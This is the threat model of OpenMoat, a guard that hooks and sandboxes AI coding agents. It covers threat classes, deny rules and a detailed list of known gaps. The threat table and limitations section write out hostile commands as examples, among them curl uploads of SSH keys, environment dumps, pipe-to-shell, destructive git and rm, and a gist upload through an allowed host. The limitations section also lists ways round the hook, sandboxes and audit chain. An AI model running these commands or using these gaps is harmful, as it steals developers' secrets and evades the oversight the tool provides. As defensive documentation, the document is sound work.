# Threat model

What OpenMoat defends, against whom, how well the current code does it, and where it
does not. The hook decides each tool call it sees; the operating system enforces the
policy only inside the host sandboxes and `moat run` ([SANDBOX.md](SANDBOX.md)), with the
limits in §5. Per-threat test counts are in [COVERAGE.md](COVERAGE.md), generated from the
conformance fixtures.

## 1. Assets

| # | Asset |
|---|---|
| A1 | Secrets on the machine: SSH keys, cloud credentials, tokens in the environment and in `.env` files, keychains |
| A2 | Source code and git history |
| A3 | Supply-chain position: publishing packages, pushing to CI, editing workflows |
| A4 | The developer's identity and reach: GitHub, cloud consoles |
| A5 | The kernel itself: policy, lock, hook configuration, the `moat` binary, the audit log |

## 2. Attacker

The attacker controls any text the agent reads: files, READMEs, issue titles, pull
request bodies, web pages, MCP tool descriptions and results, dependencies. The
attacker can publish packages and MCP servers. The attacker does not have root or
the user's shell on the machine. The model is treated as untrusted: its tool calls
are requests, and a hallucinated destructive command is handled the same way as an
injected one.

Trust zones:

| Zone | Trust |
|---|---|
| `moat` binary and the policy, after the lock check | trusted |
| The host (agent process and its hook plumbing) | semi-trusted: assumed to call the hook honestly, may be fail-open |
| The model's tool calls | untrusted |
| Commands, MCP servers, project scripts | untrusted |
| A repository policy (`<project>/.moat/policy.yaml`) | untrusted: it may add deny and ask rules; its allow rules apply only to the exact file a person trusted with `moat trust` (ADR-022) |
| Policy and hook files | integrity-checked on every call |

## 3. Threat classes

"Hook" is what the default policy decides today. "OS layer" is what the host
sandboxes and `moat run` add today, or the planned answer from the
[roadmap](ROADMAP.md) where it says *planned*; §5 lists the gaps.

| # | Class | Hook | OS layer |
|---|---|---|---|
| T1 | Secret exfiltration via shell (`curl -d @~/.ssh/id_rsa …`) | `secrets-paths` denies reads and writes of secret paths, also through `cd`, relative operands, glob operands, `~name`, symlinks and nested shells; unlisted hosts are denied by `default.net` | No reads of secret paths, network only through a proxy to allowed hosts |
| T2 | Secret exfiltration via file tools (`Read ~/.aws/credentials`) | The same path rules for Claude Code `Read`/`Glob`/`Grep`/`LSP`, Cursor `beforeReadFile` and `preToolUse` `Read`/`Grep`/`Glob`, and MCP path arguments | Only under `moat run`: Claude Code's and Cursor's file tools run outside their sandboxes |
| T3 | Secret exfiltration via the environment (`echo $OPENAI_API_KEY`, `env`) | `env-secrets` denies reads of secret-shaped names; `env-dump` denies argument-less `env`, `printenv`, `set`, `export`, `declare`, `typeset` | *Planned:* a scrubbed environment |
| T4 | Destructive git and filesystem operations | `destructive` denies force pushes in every spelling, remote branch deletion, `reset --hard`, `clean -fdx`, `branch -D`, `stash drop/clear`, `rm -rf` of `/` and `~`, `sudo`, `mkfs`, `dd if=`; recursive `rm` and discarding checkouts ask | Writes outside the project and the temp directory never reach the disk: refused on macOS, made in an in-memory home that is discarded on Linux ([SANDBOX.md](SANDBOX.md)); inside the project only the hook decides |
| T5 | Supply-chain execution (`curl … \| sh`, unknown installs) | `pipe-to-shell` denies downloads and decoded streams piped into a shell or interpreter, and `eval`; `installs` asks for package installs | Network only to allowed hosts (the registries) |
| T6 | Environment poisoning (`PATH`, `LD_PRELOAD`, planted binaries) | `env-poison` denies setting dangerous variables; executable pins deny a program that resolves somewhere else than recorded (ADR-008); `git --git-dir=…` and git config that runs a program (`-c`, `GIT_CONFIG_*`) ask, and under `moat run`, Claude Code and Codex git opens a bare repository only when named (`safe.bareRepository=explicit`) | Writes outside the project (shell startup files) never reach the disk, as for T4; in-project `.git/hooks` and `.envrc` refused except the gaps in [EVIDENCE.md](EVIDENCE.md); *planned:* a kernel-controlled environment |
| T7 | Obfuscation and nested execution (`bash -c`, `eval`, `$( … )`, here-documents, decoders) | Recursive classification to depth 4; decoder pipelines are canonicalised; anything unclear is `unparseable` and asks, while the parts around it are still decided, so a deny among them stands | The sandbox bounds what any spelling can reach |
| T8 | MCP tool poisoning, over-privileged MCP tools | `mcp` rules on tool names; path and URL arguments become `fs.*` and `net` atoms; unreadable arguments deny; arguments nested deeper than 8 levels ask | *Planned:* MCP stdio proxy with description pinning (1.0) |
| T9 | Hook and policy tampering by the agent | `kernel-self` denies writes to state, host directories (also where `MOAT_HOME`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME` or `CURSOR_CONFIG_DIR` moved them), hook files, and agent runs of `moat allow\\|doctor\\|init\\|policy\\|trust\\|uninstall` and `moat sandbox sync`; the lock denies everything after drift; Claude Code `ConfigChange` blocks a drifted settings file; a repository policy adds only deny and ask rules unless a person trusted that exact file in that checkout, and one that does not parse or sets `defaults`, `executables` or `sandbox` denies every call in the project (ADR-022); a database shell (`sqlite3`, `duckdb`) opening the audit log is a write, so `kernel-self` denies it | Under Claude Code's and Codex's sandboxes, commands cannot change `~/.moat`, the agents' settings and hook files in the home, or those in the project root (`.claude/settings*.json`, `.cursor/hooks.json`, `.cursor/sandbox.json`, `.codex/hooks.json`, `.moat`). On Linux the same files in a project subdirectory stay writable (`claude-code.linux-write-globs`, `codex.linux-write-globs` in `moat sandbox show`), and Cursor's sandbox cannot deny inside the workspace (§5); *planned:* signed policy (1.0) |
| T10 | Hook supply chain (a trojaned hook binary) | Hooks are exec-form with an absolute, stable path (ADR-016); `kernel-self` denies writes to any `bin/moat` and to the recorded binary, its directory and its link target by literal path, which the host sandboxes and Claude Code's deny rules name too; `moat init` refuses a binary inside a project, a temp directory or a directory the sandboxes may write; `doctor` names a missing or different hook binary | Releases carry build provenance attestations |
| T11 | Time of check vs. time of use, symlinks | Literal and resolved paths are both checked (ADR-009) | Sandbox path rules apply at use |
| T12 | Network to unknown hosts | `default.net` denies shell network to unlisted hosts; `cloud-metadata` denies metadata and link-local services; `local-net` asks for localhost; `moat proxy` refuses loopback, link-local and metadata addresses, and private and CGNAT ones the policy does not name, after DNS resolution; `WebFetch` of an unlisted host asks (ADR-017); after a secret read, network and MCP calls in the same session ask (`session-taint`) | Host sandboxes allow only the policy's hosts; `moat run`, and host sandboxes with `sandbox.proxy_port`, go through `moat proxy` |

## 4. Out of scope

- An attacker with root, or with the user's own shell outside the agent.
- A malicious `moat` binary from a compromised release pipeline. Releases carry build
  provenance attestations (`gh attestation verify`), which show where an artefact was
  built, not that the pipeline was sound.
- Attacks on the model provider, and agents that run in a vendor's cloud.
- Prompt-injection detection in text. OpenMoat governs actions, not intent.

## 5. Known limitations

These hold for the current code. Each is a design consequence or a tracked gap, not
something OpenMoat claims to stop.

- **Outside the sandboxes, the hook decides alone.** `moat run` (below) is the one
  place OpenMoat applies a sandbox itself. In the Standard tier (ADR-018), `moat init`
  configures the agent's own sandbox from the policy, so commands Claude Code runs
  through `Bash`, `PowerShell` and `Monitor`, every command Codex runs, and the
  terminal commands Cursor runs in its sandbox are confined by the operating system:
  no reads of `secrets-paths`, no reads outside the project and `sandbox.read_roots`,
  no writes outside the project (and the temp directory) that reach the disk (on
  Linux they land in an in-memory home that is discarded), and no network except
  allowlisted domains. A classifier mistake inside those bounds is
  still a bypass, and in scope as a vulnerability ([SECURITY.md](../SECURITY.md)).
- **What the Standard tier does not cover.** It is as strong as each host's sandbox
  and OpenMoat's translation, and every host version bump must keep the generated keys
  working (`moat doctor` names a weakened setting; the differential suite executes
  them, [EVIDENCE.md](EVIDENCE.md)). Cursor's `sandbox.json` cannot deny a path
  inside the workspace, so the policy's denies there (`.env`, `.moat`, `.git` apart
  from the hooks and config Cursor protects itself) do not bind its sandboxed
  commands, and Cursor runs some commands outside its sandbox (below and
  [SANDBOX.md](SANDBOX.md#cursors-sandbox)). On Linux, Claude Code's sandbox denies a
  project script the `.env` files that exist under the session's working directory when
  the command starts (#359); one created later, or one in another readable directory
  (`/add-dir`, a read root, a path outside the user directories), stays readable.
  It also drops every glob among the write denies (#372): only `.env`, `.envrc` and
  `.moat` directly in the working directory, and that directory's own `.git` hooks and
  config, are kept from sandboxed writes there; a `.env` or `.moat` in a subdirectory,
  `.env.local`, `.git/info/attributes`, submodule hooks and a project's `bin/moat` stay
  writable. Codex on Linux hides a `**/` deny's matches only after listing every directory below
  it, and runs no command when one is unreadable, so the generated profile repeats the
  `.env` denies only in the project and the read roots inside the home (#358): a
  sandboxed command can read a `.env` under `/etc`, `/usr` or `/tmp` outside the
  project, and on Linux a `.env` created after the command started. It can also
  create a missing match there, except `.env` and `.envrc` directly in a workspace
  root, which the profile denies by name (#377): `.env.local`, a `.envrc` in a
  subdirectory and a project's `bin/moat` stay creatable. OpenMoat does not configure
  terminal input (`TIOCSTI`) in the host sandboxes; what EVIDENCE.md shows is the hosts'
  own behaviour: Claude Code starts its commands without a terminal, Codex's macOS
  profile refuses `TIOCSTI`, and Codex's Linux sandbox does not, so only a kernel with
  `dev.tty.legacy_tiocsti` at 0 (`EIO`, as on CI's runner) stops a sandboxed script
  there from typing a command into the terminal for the user's shell; `moat doctor` warns on Linux with Codex set up when that setting allows it, or when the kernel (before 6.2) has none. Claude Code's file tools, `WebFetch`, MCP servers and hooks run
  outside its sandbox; only the hook governs them. Writes by a sandboxed command to
  the session's working directory are allowed even when the session started above
  the git root, and Claude Code leaves paths outside the user directories (`/Users`,
  `/home`, `/Volumes`, …) readable. `sandbox.read_roots` (toolchains, `/usr`, temp)
  are readable by sandboxed commands while the hook still asks for them. Egress goes
  to allowlisted domains through the hosts' proxies, which check the requested host
  name, so any allowlisted host stays a relay. `moat sandbox show` lists every loss
  and allowance; ADR-018 lists the open risks.
- **Translation losses (stricter than the policy).** Neither host can re-allow
  `.env.example`, `.env.sample` or `.env.template` inside the `**/.env.*` deny, so
  sandboxed commands cannot read them; Claude Code's file tools refuse them too, by the
  deny rules `moat init` writes on every OS so that they hold when the hook does not run. Codex keeps `.git` read-only for sandboxed
  commands and asks to run `git commit` outside. Claude Code's file tools refuse reads outside the
  working directories (`permissions.blockReadsOutsideWorkingDirectories`) where the
  hook would ask.
- **Claude Code's sandbox writes `.git`.** So that `git commit` works, sandboxed
  commands may write any `.git` except `hooks`, `config`, `config.worktree`,
  `info/attributes`, a linked worktree's `commondir` and the same in submodules
  (ADR-021, #203); renaming `.git` or `.git/hooks` is refused too. On Linux only the
  working directory's own repository is covered, by Claude Code itself, without
  `info/attributes` and submodules (#372). A script can still
  rewrite refs and objects (history tampering, which `git log`, signatures and review
  can show), write a rebase todo that a person later continues, or write a `.git`
  *file* (`gitdir: …`) below the project. The hook asks for any write to a `.git`
  file or directory in the project, nested ones included, and for `git --git-dir=…`;
  `moat run` on macOS keeps a nested `.git` unwritable too. Git does not open a
  directory that merely looks like a bare repository under `moat run`, Claude Code or
  Codex (`safe.bareRepository=explicit`, git 2.38 or later; Cursor has no setting for it).
- **The Lightweight tier (`moat run`) is weaker per command than the Standard tier.**
  It confines the agent process and everything it starts in one sandbox
  ([ARCHITECTURE.md](ARCHITECTURE.md) §14). What the agent needs, every script it runs
  gets too:
  - its executable and `--write` state directory;
  - its API host through the proxy;
  - credentials in its environment (`ANTHROPIC_API_KEY`).

  The keychain is never granted, so a project script cannot read the agent's OAuth
  token from it. The agent's own sandbox must be off inside, because sandboxes do not
  nest, so there is no per-command boundary below OpenMoat's. Unlike the Standard tier,
  the agent's in-process tools (file tools, `WebFetch`, the MCP servers it starts) are
  inside the sandbox too.

  Other limits:
  - Network is the proxy alone: a tool that ignores `HTTP(S)_PROXY` has none, and
    any allowlisted host stays a relay.
  - On macOS it uses `sandbox-exec`, which Apple has deprecated (Codex, Claude Code
    and Chromium still use it). It needs macOS 14 or later: the generated profile
    names `(ioctl-command TIOCSTI)`, an identifier `sandbox-exec` only recognises
    from macOS 13 onwards. On macOS 12 and earlier `sandbox-exec` refuses to parse
    the profile and `moat run` exits without starting the agent (fail closed). CI
    covers `macos-14` and `macos-15-intel`; GitHub Actions no longer offers a
    `macos-13` runner, so macOS 13 is not exercised and is unsupported in practice
    (#389).
  - The profile leaves every file's existence, size and times visible.
  - On Linux, Landlock only grants. Secrets inside a granted tree stay readable and
    writable for the agent's commands: `.env` in the project, `~/.cargo/credentials.toml`
    in a read root, the project's `.git`. The hook still denies them for the agent's
    tool calls. `moat run --isolate` closes this where bubblewrap runs (below).
  - Also on Linux, the proxy's port is reachable on any host.
  - On Linux a seccomp filter allows only IPv4 and IPv6 TCP sockets, so the user's
    D-Bus session bus, other Unix sockets, UDP, raw, netlink and packet sockets are
    closed (`EPERM`), and `io_uring`, which could create sockets around the filter, is
    refused. So are `ptrace` and `process_vm_readv`/`writev`: a command cannot read
    the agent's memory, and debuggers do not work. Names resolve only through the
    proxy: a tool that ignores `HTTP(S)_PROXY` cannot resolve them. `socketpair()`
    stays allowed; its sockets reach only each other.
  - The agent shares the user's terminal. Typing into it is refused: `TIOCSTI` on
    macOS (Seatbelt), `TIOCSTI` and `TIOCLINUX` on Linux (the seccomp filter, also
    inside `--isolate`), whatever the kernel's `dev.tty.legacy_tiocsti` says.
    Otherwise a script could leave a command in the terminal's input that the
    user's shell runs after the session, outside the sandbox (CVE-2017-5226). Output
    is not filtered: escape sequences a command prints reach the terminal emulator.
    OpenMoat's own text output (`moat show`, `moat status`, `moat policy check`, the
    guard's deny line) shows control characters in agent text as `?`.

  `moat run` prints each allowance before the agent starts. What it stops in an allowed
  project script, per operating system, and the gaps above, are executed in CI and
  listed in [EVIDENCE.md](EVIDENCE.md).
- **The Isolated tier (`moat run --isolate`) is Linux only so far.** bubblewrap gives
  the agent a root with only the project, the read roots, the `--write` paths and an
  empty temp directory, and a network namespace whose only exit is OpenMoat's proxy,
  with the Lightweight tier's Landlock rules and seccomp filter inside
  ([SANDBOX.md](SANDBOX.md#moat-run---isolate-isolated-tier-linux)). It hides what the
  policy denies inside those trees only where it exists when the session starts (and
  `.env`, `.envrc` and `.moat` directly in the project even when missing): a match a
  command creates later stays open to the agent's commands. The agent and its scripts
  still share one sandbox, so everything the agent needs (its state, its API host,
  the credentials in its environment) its scripts get too. It depends on bubblewrap and
  on the kernel's user namespaces, which have their own CVE history. On macOS it
  refuses until it has a virtual machine (#175).
- **Project scripts run arbitrary code.** `npm test`, `npm run *`, `cargo test`,
  `cargo run`, `make`, `make test`, `pytest`, `python -m venv` and similar are allowed
  by `dev-shell`. They run whatever the project's scripts, build files and test files
  say, and OpenMoat sees only the command line. `source .venv/bin/activate` runs the
  project's activate script in the agent's shell, and the `PATH` it sets makes later
  commands in that shell run programs from the project's `.venv/bin`. An agent that can write into the project can therefore run
  any code through an allowed command. In the Standard tier that code runs inside the
  host's sandbox, and under `moat run` inside OpenMoat's, with the bounds above. Under
  Cursor the code runs in Cursor's sandbox as the `sandbox.json` OpenMoat generates
  sets it (macOS and Linux), which cannot deny a path inside the workspace (`.env`,
  `.git` stay open to it), and with the user's permissions when Cursor runs the
  command outside it: after its Auto-review classifier approves it, in Run Everything
  mode, in Allowlist mode with sandboxing off, in the Cursor CLI without `--sandbox
  enabled`, and on native Windows. The Cursor CLI can also run under `moat run`
  (SANDBOX.md).
- **Allowed hosts are relays.** `registries` allows network to `api.github.com`,
  `github.com` and the package registries. The host check passes for any command
  that reaches them, so a command that is itself allowed (a project script) or that
  a person approves at the prompt (`curl -X POST https://api.github.com/gists -d
  @file` asks on its `shell` atom only) can send data there. A `WebFetch` GET can
  carry data in its URL; the prompt shows the URL. Session taint (POLICY.md §4.1)
  narrows this. After a secret read, `net`, `fetch` and MCP calls in the same session
  ask. After a `fetch` or an MCP result, writes to CI, git hooks, build scripts and
  agent instruction files ask, and so do writes to the paths a policy adds under
  `taint.protected_writes`.
- **Session taint is minimal.** It follows host tool calls only: proxied connections
  carry no session. It does not count these as untrusted content: shell network to
  allowed hosts (`gh pr view`, `git pull`), an allowed command that reads secrets at run
  time (a project script), or a command OpenMoat cannot classify. A secret that leaves
  through an allowed command without a `net` atom (`npm test`) is not seen. With the
  default policy, `secrets-paths` denies, so only the secrets broker (#172) or a policy
  that asks for secret reads can taint a session. An edited or deleted audit event
  clears taint until `moat doctor` reports the broken chain.
- **The secrets broker (ADR-020) keeps a value from the agent, nothing more.**
  `openmoat-proxy` holds the value of each `secrets:` entry. It refuses and records
  (`proxy-secret`) any request to another host whose head, or plain-HTTP body, carries
  the placeholder or the value. It defends against a prompt-injected agent that sends
  the token it holds to a host of the attacker's choosing, or through an allowed relay.
  The agent only ever holds the placeholder. It does not defend against:
  - an agent that reads the source itself (a file or variable no deny rule covers;
    `moat policy lint` warns);
  - the value encoded (base64, percent-encoding, compression) or split across requests,
    since the check matches exact bytes;
  - anything inside a CONNECT tunnel, which is TLS and is not decrypted;
  - an observer on the network path of a plain-HTTP request to the owner host. The proxy
    injects the value there in clear text, but only for a secret that opts in with
    `plain_http: true`, which `moat policy lint` flags for any host off this machine;
  - covert channels such as timing, or data hidden in requests to the owner host;
  - an agent that asks the user to paste the secret into the conversation;
  - the owner host itself misusing or reflecting the token;
  - traffic that does not go through `moat proxy`: the agent's own requests and
    in-process tools; every host sandbox command unless the policy sets
    `sandbox.proxy_port`; and even then, under Codex, every command whose Codex was
    started without `HTTP(S)_PROXY` naming it (ARCHITECTURE.md §13).
- **By default the host sandboxes' own proxies decide network.** The default is no
  `sandbox.proxy_port`. Claude Code's and Codex's proxies then enforce the policy's
  domain names, with no direct route out. They do not write OpenMoat's audit log, do
  not inject brokered secrets, and decide only by domain name. Claude Code still
  refuses local addresses through its own check; Codex refuses link-local and private
  ones.
- **With `sandbox.proxy_port`, host sandbox network depends on a running `moat proxy`.**
  - Claude Code's sandboxed commands reach the network only through it. While it is
    stopped they have none, and `moat doctor` and `moat status` warn; nothing falls
    back to direct network.
  - Programs that speak only SOCKS5 have no network at all.
  - Codex's proxy hands what it allows to `moat proxy` only when Codex runs with
    `HTTP(S)_PROXY` naming it, which `config.toml` cannot set.
  - Codex's own API requests then go through `moat proxy` too. Its API hosts
    (`api.openai.com`, `chatgpt.com`) need a `fetch` allow rule, or Codex cannot reach
    its model.
- **When the hook fails, most hosts run the call.** The host rows below come from
  each host's documentation or source as of 2026-10-07 ([Claude Code hooks][cc-hooks],
  [Codex hooks][codex-hooks] and [`pre_tool_use.rs`][codex-pre],
  [`command_runner.rs`][codex-runner], [Cursor hooks][cursor-hooks], Continue
  [`hookRunner.ts`][cn-runner]); *unverified* marks what the source does not state.
  The rows marked "ours" are tested end to end with the real binary
  (`crates/openmoat-cli/tests/e2e/host_failures.rs`), and `protection.rs` (`gaps`)
  repeats the host rows in each agent's `known gaps` line.

  | Case | Claude Code | Codex | Cursor | Continue CLI |
  |---|---|---|---|---|
  | Hook binary missing or cannot start | runs the call | runs the call | blocks: `moat init` sets `failClosed` (*unverified* for a missing binary; Cursor runs a shell string, which exits 127) | runs the call |
  | Hook crashes or exits non-zero, not 2, without output | runs the call | runs the call | blocks (`failClosed`) | runs the call |
  | Hook times out | runs the call | runs the call | blocks (`failClosed`) | runs the call (a killed hook counts as exit 0) |
  | Timeout: host default / set by `moat init` | 600 s / 600 s (`ConfigChange` 60 s) | 600 s / 600 s | not documented (*unverified*) / 600 s | 600 s / 600 s (Claude Code's entry) |
  | Hook prints no or malformed JSON, exit 0 | runs the call | runs the call | blocks (permission hooks) | runs the call |
  | Exit 2 | blocks | blocks when stderr is not empty | blocks | blocks |
  | Ours: malformed or truncated payload, unknown event | deny, exit 2 | deny, exit 2 | deny, exit 2 | deny, exit 2 |
  | Ours: tool OpenMoat does not know | allow, rule `ungoverned`, recorded; the installed matcher sends only mapped tools | as Claude Code | a tool naming a path is checked as reading it (writing it when its name is write-shaped); otherwise `tool.unknown`, which asks (sent as a deny) | as Claude Code |
  | Ours: no decision within 10 s (`GUARD_BUDGET_S`) | deny, exit 2; listed in `~/.moat/guard-hangs.log`, not the audit log | same | same | same |
  | Ours: hook missing, out of date or naming a binary that does not exist | `moat status` and `moat doctor`: `not protected` | same | same | not applicable: `cn` fires no hooks (below) |

  `guard` writes the reason of every deny to stderr, so Codex honours its exit 2, and
  turns its own panics into a deny. A crash that bypasses that (killed, aborted, out of
  memory) or a missing binary leaves Claude Code, Codex and `cn` with no way to block:
  none of them has a fail-closed setting; Claude Code's own deny rules for secrets and
  OpenMoat's files, which `moat init` writes on every OS, still hold for its file tools
  then. A `guard` that hangs denies after 10 s, well
  before any host timeout `moat init` sets, so the host never reaches the timeout that
  would run the call; that deny goes to a side file (`~/.moat/guard-hangs.log`, which
  `moat doctor` reports), not the audit log, because what hangs may be the audit log.

  [cc-hooks]: https://code.claude.com/docs/en/hooks
  [codex-hooks]: https://developers.openai.com/codex/hooks
  [codex-pre]: https://github.com/openai/codex/blob/main/codex-rs/hooks/src/events/pre_tool_use.rs
  [codex-runner]: https://github.com/openai/codex/blob/main/codex-rs/hooks/src/engine/command_runner.rs
  [cursor-hooks]: https://cursor.com/docs/agent/hooks
  [cn-runner]: https://github.com/continuedev/continue/blob/main/extensions/cli/src/hooks/hookRunner.ts
- **The Continue CLI.** The released Continue CLI does not run hooks: `cn` 1.5.47 (continuedev/continue
  `main` at `5522c6f`) loads them but fires no event (continuedev/continue#11043 closed
  unmerged), so OpenMoat cannot check its tool calls today. Run `cn` under `moat run`. When a
  release fires them, `cn` will load OpenMoat's Claude Code hook from
  `~/.claude/settings.json` and `.claude/settings.json`; `guard` already recognises
  `cn` and sends it every `ask` as a deny (ARCHITECTURE §5), and the table above shows
  what its hook runner does on a failure.
  `moat doctor` and `moat status` warn when `cn` is on the search path or its directory
  (`~/.continue`, or `CONTINUE_GLOBAL_DIR`) exists. `cn` names some tool arguments
  differently (`Read` `filepath`); those calls are denied as malformed.
- **Cursor file tools cannot ask.** Cursor runs a `preToolUse` call answered `ask`
  and accepts only allow or deny from `beforeReadFile`, so OpenMoat sends an `ask`
  there as a deny. A file write or read that needs approval is blocked until a person
  approves that exact file with `moat` or `moat allow --last`, or a policy allow rule
  covers it.
- **Ungoverned tools.** Claude Code orchestration tools whose own calls are hooked;
  Codex web search (a hosted tool its hook never sees) and other hosted tools;
  Cursor `Shell` and `MCP:<tool>` under `preToolUse` (governed by `beforeShellExecution`
  and `beforeMCPExecution` instead) and `Task`. Ungoverned calls that reach the hook are
  allowed with rule `ungoverned` and recorded. Any other Cursor tool that names no path
  is `tool.unknown`, which asks by default. Claude Code and Cursor `WebSearch` are
  governed: `web.search` in `defaults` decides them, and a search after a secret read asks.
- **No settings veto outside Claude Code.** Codex and Cursor have no `ConfigChange`
  event, so a tampered hook file there is caught on the next tool call, not when it
  is written.
- **PowerShell is not parsed.** Claude Code `PowerShell` always asks. A PowerShell
  line given to a POSIX shell tool is lexed as POSIX and usually falls through to the
  `ask` default.
- **Pattern lists are incomplete by nature.** Pseudo-terminal routes to `moat allow`
  (ADR-011, ADR-014), environment dumps through interpreters (`python -c
  'print(os.environ)'`, ADR-010), and options that run programs (ADR-012) are matched
  by lists. Spellings outside the lists ask or, if a broad allow covers them, are
  allowed.
- **TOCTOU and hard links.** A link swapped between the check and the command
  running, and hard links, are not seen (ADR-009).
- **Glob operands are expanded at decision time.** An unquoted `* ? [` path operand
  is checked as every file it matches when the hook runs (POLICY.md §4), with
  `bash` defaults (no `dotglob`, `nocaseglob` or `extglob`; `**` as `globstar`). A
  file created between the check and the command that a pattern's last component
  matches is not seen. Shell options that change matching (`shopt -s dotglob
  nocaseglob extglob`, `zsh` `EXTENDED_GLOB` and `GLOB_DOTS`), `zsh` qualifiers and
  `<1-9>` ranges are not modelled. Brace expansion follows `bash`, also for shells
  that do not expand braces (`sh` as `dash`), where the literal word is not checked. Claude Code
  `Glob` and `Grep` are checked as reads of their search directory, as before:
  `Glob` returns names, not contents, and `Grep` searches the whole directory
  whatever its `glob` filter.
- **The terminal check is not a boundary.** `moat allow`, `moat trust`, `moat uninstall` and `moat doctor --accept`
  check for a TTY. The `kernel-self` rules and the lock are what stop an agent from
  re-pinning or granting itself anything.
- **Repository rules are hook-only, and a repository can block itself.** A
  repository policy is merged into the hook decision only. Host sandboxes and
  `moat proxy` are generated per user from the user policy, so a repository deny is
  not enforced by an OS layer. A malicious or broken repository policy can deny
  every call in its own project (`kernel-error`). Any repository could do the same
  with one deny rule, and it fails closed. By itself it cannot widen anything: its
  ask rules never soften a user deny, and its allow rules wait for `moat trust`.
  Once trusted, its allow rules are as strong as the person's own, below the
  person's deny rules. A trusted repository whose maintainers turn malicious
  widens only through a new file version, which drops back to tightening-only
  until someone trusts it again (ADR-022).
- **The binary is pinned by path, not digest** (ADR-006, ADR-016). Whoever can replace
  the file the stable link points at decides what the hooks run. The recorded path, its
  directory and its link target are protected by literal path (`kernel-self`, every
  host sandbox, Claude Code's deny rules); a digest check would add nothing, since a
  replaced binary decides whether to run it.
- **Claude Code's `theme` setting is not pinned** (#287). Claude Code writes it to
  `settings.json` itself; it changes only colours, and every other key stays pinned.
- **`CLAUDE_CONFIG_DIR` must match for `init`.** `moat init` installs hooks where its
  own environment points and records that directory in `~/.moat/hosts.json`, which the
  lock pins; later commands use the record, not their shell's variables, and `doctor`
  reports a variable that disagrees (#298). An agent started with another directory
  than the recorded one is not hooked. Re-pinning (`allow`, `doctor --accept`) keeps
  every hook file the lock already pins, and `doctor`/`status` report an installed hook
  file the lock does not pin (#158). `kernel-self` covers both each agent's recorded
  directory and the one its variable names.

- **The audit chain is tamper-evident, not tamper-proof.** The hash chain
  ([ARCHITECTURE.md](ARCHITECTURE.md) §7) makes an edit, a deletion or a reordering in the middle of the
  log visible to `moat doctor`. It is unkeyed and lives in the file it protects, so
  whoever can write `~/.moat/audit.db` (the user's account, or an allowed command
  running as the user, see "Outside the sandboxes") can delete the newest events and leave a
  valid shorter chain (an agent's `sqlite3 ~/.moat/audit.db …` is a write that
  `kernel-self` denies), or rewrite events and recompute every hash after them. Keeping
  the head hash or count elsewhere on the same machine would need a second write on
  every `guard` call and could be rewritten by the same attacker, so it is not done.
  Anchoring the head off the machine is left to the person: `moat doctor` and
  `moat audit verify` print it, and `moat audit verify --anchor` checks a later
  export against it. Events written before audit schema 2 are not covered.
- **What verifying an export proves.** `moat audit verify` shows that every line is
  the event its hash commits to, and that runs of consecutive ids are unbroken
  links. It does not show that the export is complete. Dropping the newest lines,
  or exporting from a truncated log, leaves a file that verifies, and so does
  deleting a middle event, which looks like a filter gap. Only an anchored head
  catches those: a recorded hash that the export must contain. The anchor does not
  cover events after it. Anyone who can write the database can recompute every hash
  before exporting (the chain is unkeyed), so an export is evidence about the log
  as it was at export time, no more. Exported cells are the redacted store cells.
  A secret shape that redaction learned after an event was recorded stays in that
  event.
- **What audit redaction guarantees.** The value of a brokered secret of 8 bytes or
  more never appears verbatim, in any letter case, in a row the proxy records, nor in
  the row of a call the policy decides in `moat guard` when the secret has a `file`
  or `env` source the guard can read. Known token formats are removed by pattern. Nothing else is guaranteed: a
  secret OpenMoat does not hold (one only in the agent's environment or files) and of
  no known format is stored as sent; so is a brokered value that was encoded (base64,
  URL escapes), split, or shorter than 8 bytes; a keychain-sourced value is not
  masked in guard rows; values from before a secret was added stay in old rows. The
  matcher's copy of the values is not zeroed when the process exits. Redaction limits
  what the log reveals; it does not stop the secret being sent, which is the policy's
  and the proxy's job.

## 6. How the claims are tested

- **Conformance suite.** `tests/conformance/{attacks,benign,ask}.yaml`: one tool
  call per fixture, with the verdict and rule ids the default policy must give. Every
  attack and ask fixture names its threat class, every class needs at least one
  attack fixture, and [COVERAGE.md](COVERAGE.md) is generated from them. Every valid
  bypass becomes a fixture before its fix is published.
- **End-to-end tests** run the real binary as a hook in isolated homes: lock drift,
  `ConfigChange`, approvals, install paths, every host's payloads.
- **MoatBench mini** ([MOATBENCH.md](MOATBENCH.md)): multi-step attack and benign
  scenarios sent as Claude Code, Codex and Cursor payloads to the real binary, with a
  scorecard of verdicts, false positives and known gaps.
- **Fuzzing.** `cargo fuzz` targets for the shell path through the engine, policy
  parsing, host payloads and `moat allow --always` patterns run in CI on every pull
  request and weekly.
- **Differential suite** (`tests/differential/scenarios.yaml`): each scenario runs
  against the hook decision and each host sandbox whose binary is present, and hostile
  project scripts run under `moat run`, Claude Code's sandbox and Codex's `moat`
  profile on macOS and Linux, with the OS outcome (`EPERM`, `EACCES`, a proxy's 403)
  asserted. CI's `standard tier` job runs the host sandboxes with pinned Claude Code
  and Codex binaries, a local fake API and no account. [EVIDENCE.md](EVIDENCE.md) is
  the results table, generated from the same file; known gaps are listed there as gaps.
- **Planned:** differential testing of the lexer against real `bash` (#461), and the full
  MoatBench, which measures attack success with and without OpenMoat across live agents ([ROADMAP.md](ROADMAP.md)). Prompt fatigue is measured
  today only by `moat report` (asks per active hour).
